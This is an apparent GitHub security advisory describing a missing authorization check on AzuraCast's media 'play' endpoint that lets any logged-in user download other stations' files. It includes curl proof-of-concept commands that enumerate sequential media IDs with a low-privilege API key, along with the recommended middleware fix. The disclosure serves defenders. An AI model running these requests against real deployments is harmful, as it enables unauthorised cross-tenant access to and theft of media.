# [M] AzuraCast has Missing Permissions Check on Media File Download, Allowing Cross-Station Data Exfiltration

## Summary
Severity: Medium
Advisory: GHSA-qff7-q5fm-8p76
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-qff7-q5fm-8p76
Type: github-advisory

## Affected
- Packagist: `azuracast/azuracast` — affected >=0 <0.23.6

## Details
## Summary

The `GET /api/station/{station_id}/file/{id}/play` endpoint, handled by `PlayAction`, is missing the `Middleware\Permissions` check that protects all sibling routes in the same `/file/{id}` route group. Any authenticated user can download media files from any station, regardless of whether they have permissions on that station. In multi-tenant deployments, this enables cross-station media exfiltration.

## Details

In `backend/config/routes/api_station.php`, the `/file/{id}` route group (lines 407-429) defines four endpoints:

```php
// Line 407-429
$group->group(
    '/file/{id}',
    function (RouteCollectorProxy $group) {
        // GET /file/{id} — has Permissions check ✓
        $group->get('', ...)->add(new Middleware\Permissions(StationPermissions::Media, true));

        // PUT /file/{id} — has Permissions check ✓
        $group->put('', ...)->add(new Middleware\Permissions(StationPermissions::Media, true));

        // DELETE /file/{id} — has Permissions check ✓
        $group->delete('', ...)->add(new Middleware\Permissions(StationPermissions::DeleteMedia, true));

        // GET /file/{id}/play — NO Permissions check ✗
        $group->get('/play', Controller\Api\Stations\Files\PlayAction::class)
            ->setName('api:stations:files:play');
    }
);
```

The middleware chain for the `/play` endpoint is: `GetStation → RequireStation → RequireLogin → StationSupportsFeature(Media) → PlayAction`. The `RequireLogin` middleware (`backend/src/Middleware/RequireLogin.php`) only verifies a valid session/API key exists — it does not check station-level permissions.

The controller at `backend/src/Controller/Api/Stations/Files/PlayAction.php:84` calls `$this->mediaRepo->requireForStation($id, $station)`, which verifies the media belongs to the station but performs no authorization check. The `findForStation` method (`StationMediaRepository.php:46-66`) accepts both auto-increment integer IDs and unique IDs, making enumeration trivial via sequential integers.

This is notably similar to the regression fixed in commit `7fbc7dd` (2026-02-26), which restored a missing group-level `Permissions` middleware on the adjacent `/files` group. The `/play` route was missed in that fix.

## PoC

```bash
# Step 1: Create two stations (Station A and Station B) in a multi-tenant AzuraCast instance.
# Upload media files to Station B.

# Step 2: Create a user with permissions ONLY on Station A. Generate an API key for this user.
API_KEY="user-with-only-station-a-access"

# Step 3: Enumerate and download media from Station B (station_id=2) using sequential IDs
# This should return 403 Forbidden, but instead returns the file content
curl -H "X-API-Key: $API_KEY" https://target/api/station/2/file/1/play -o stolen1.mp3
# HTTP 200 OK — file downloaded successfully

curl -H "X-API-Key: $API_KEY" https://target/api/station/2/file/2/play -o stolen2.mp3
# HTTP 200 OK — file downloaded successfully

# Step 4: Verify the same user is correctly blocked on other endpoints in the same group
curl -H "X-API-Key: $API_KEY" https://target/api/station/2/file/1
# HTTP 403 Forbidden — permission check works here
```

## Impact

- Any authenticated user can download the full media library of any station in the instance, regardless of their assigned permissions.
- In multi-tenant deployments (e.g., hosting providers running multiple radio stations), a user of Station A can exfiltrate all copyrighted audio content from Station B.
- Media IDs use auto-increment integers (`HasAutoIncrementId` trait on `StationMedia`), enabling trivial enumeration of all media files.
- The confidentiality impact is High: full media file contents (MP3, FLAC, etc.) are exposed.

## Recommended Fix

Add the `Permissions` middleware to the `/play` route, matching the pattern used by the adjacent routes:

```php
// backend/config/routes/api_station.php, line 426-427
// Before:
$group->get('/play', Controller\Api\Stations\Files\PlayAction::class)
    ->setName('api:stations:files:play');

// After:
$group->get('/play', Controller\Api\Stations\Files\PlayAction::class)
    ->setName('api:stations:files:play')
    ->add(new Middleware\Permissions(StationPermissions::Media, true));
```

## References
- https://github.com/AzuraCast/AzuraCast/security/advisories/GHSA-qff7-q5fm-8p76
- https://github.com/AzuraCast/AzuraCast/commit/ba92dc3f0ea15a9c0ba0f4557d99a9a26004108f
- https://github.com/AzuraCast/AzuraCast
